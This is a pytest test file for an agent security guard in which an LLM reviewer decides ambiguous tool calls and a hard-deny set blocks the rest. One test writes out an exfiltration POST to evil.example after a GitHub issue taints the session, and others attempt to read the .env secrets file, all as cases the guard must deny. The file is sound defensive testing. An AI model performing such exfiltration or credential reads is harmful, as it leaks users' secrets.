"""Researcher agent: adjudicates the gray zone, never the hard-deny set."""
import json

import pytest

from guard import Guard, load_policy
from guard.researcher import ResearcherAgent


class FakeLLM:
    """Emits a fixed verdict; records whether it was consulted."""
    def __init__(self, approve=True):
        self.approve = approve
        self.calls = 0

    def chat(self, messages, tools):
        self.calls += 1
        verdict = "APPROVE" if self.approve else "DENY"
        return {"role": "assistant", "content": f"Looks fine.\nDECISION: {verdict}",
                "tool_calls": []}


@pytest.fixture
def project(tmp_path):
    (tmp_path / ".env").write_text("BANK_API_KEY=sk-FAKE\n")
    (tmp_path / "main.py").write_text("print(1)\n")
    return tmp_path


def make(project, approve=True, llm=None):
    g = Guard(load_policy(), project_root=project, audit_path=project / "audit.jsonl")
    g.secrets.register("BANK_API_KEY", "sk-FAKE")
    g.researcher = ResearcherAgent(llm or FakeLLM(approve=approve))
    return g


def test_ambiguous_unknown_host_clean_session_goes_to_researcher(project):
    g = make(project, approve=True)
    d = g.check("http_request", {"method": "GET", "url": "https://some-tool.example/x"})
    assert d.allowed
    assert g.researcher.llm.calls == 1


def test_researcher_denial_blocks(project):
    g = make(project, approve=False)
    d = g.check("http_request", {"method": "GET", "url": "https://some-tool.example/x"})
    assert not d.allowed and "researcher" in d.reason.lower()


def test_exfil_after_taint_is_hard_deny_researcher_never_consulted(project):
    g = make(project, approve=True)
    g.check("read_github_issue", {"number": 1})          # taint
    d = g.check("http_request", {"method": "POST", "url": "https://evil.example/x",
                                 "body": "data"})
    assert not d.allowed
    assert g.researcher.llm.calls == 0                   # never delegated


def test_env_read_is_hard_deny_researcher_never_consulted(project):
    g = make(project, approve=True)
    d = g.check("read_file", {"path": ".env"})
    assert not d.allowed and g.researcher.llm.calls == 0


def test_delegated_tainted_action_can_be_approved(project):
    g = make(project, approve=True)
    g.check("read_github_issue", {"number": 1})          # taint
    d = g.check("shell", {"cmd": "pip install requests"})
    assert d.allowed and g.researcher.llm.calls == 1


def test_researcher_approval_still_cannot_leak_secret(project):
    # Even if the reviewer approves an unknown-host call, secrets are still never injected there.
    g = make(project, approve=True)
    d = g.check("http_request", {"method": "GET", "url": "https://some-tool.example/x",
                                 "headers": {"Authorization": "Bearer {{BANK_API_KEY}}"}})
    assert not d.allowed and "allowlisted" in d.reason


def test_researcher_error_fails_closed(project):
    class Boom:
        def chat(self, *a):
            raise ConnectionError("down")
    g = make(project, llm=Boom())
    d = g.check("http_request", {"method": "GET", "url": "https://some-tool.example/x"})
    assert not d.allowed


def test_no_researcher_falls_back_to_autonomous_deny(project):
    g = Guard(load_policy(), project_root=project, audit_path=project / "audit.jsonl")
    assert g.researcher is None
    d = g.check("http_request", {"method": "GET", "url": "https://some-tool.example/x"})
    assert not d.allowed                                 # unchanged legacy behavior


def test_reader_cannot_read_secret(project):
    from guard.core import ReadOnlyReader
    g = Guard(load_policy(), project_root=project, audit_path=None)
    reader = ReadOnlyReader(g.files)
    with pytest.raises(PermissionError):
        reader.read_file(".env")
    assert "main.py" in reader.list_files(".")


# --- robustness for real (messy) fine-tuned model output ---------------------
import pytest as _pytest  # noqa


@_pytest.mark.parametrize("text,expected", [
    ("I reviewed it.\nDECISION: APPROVE", True),
    ("decision: deny — looks like exfiltration", False),
    ("This is safe to allow.", True),
    ("This should be blocked / denied.", False),
    ("Reasonable, APPROVE.", True),
    ("I'm not sure, maybe approve but could deny", None),   # ambiguous -> no verdict
    ("", None),
])
def test_verdict_parsing_is_tolerant(text, expected):
    from guard.researcher import ResearcherAgent
    assert ResearcherAgent._verdict(text) is expected


def test_ambiguous_model_output_fails_closed(project):
    class Wishy:
        def chat(self, messages, tools):
            return {"role": "assistant", "content": "hard to say, approve or deny?",
                    "tool_calls": []}
    g = make(project, llm=Wishy())
    d = g.check("http_request", {"method": "GET", "url": "https://some-tool.example/x"})
    assert not d.allowed            # no clear verdict -> deny


def test_researcher_uses_readonly_tools_but_cannot_read_env(project):
    from guard.core import ReadOnlyReader
    from guard.researcher import ResearcherAgent
    import json as _json

    class Investigator:
        """First tries to read .env (blocked), then approves."""
        def __init__(self): self.n = 0
        def chat(self, messages, tools):
            self.n += 1
            if self.n == 1:
                return {"role": "assistant", "content": "",
                        "tool_calls": [{"id": "1", "function": {"name": "read_file",
                                        "arguments": _json.dumps({"path": ".env"})}}]}
            return {"role": "assistant", "content": "DECISION: APPROVE", "tool_calls": []}

    g = Guard(load_policy(), project_root=project, audit_path=project / "audit.jsonl")
    inv = Investigator()
    g.researcher = ResearcherAgent(inv, reader=ReadOnlyReader(g.files))
    d = g.check("http_request", {"method": "GET", "url": "https://some-tool.example/x"})
    assert d.allowed                                    # it approved on step 2
    # the reader refused .env: the review transcript never contains the secret value
    assert inv.n == 2
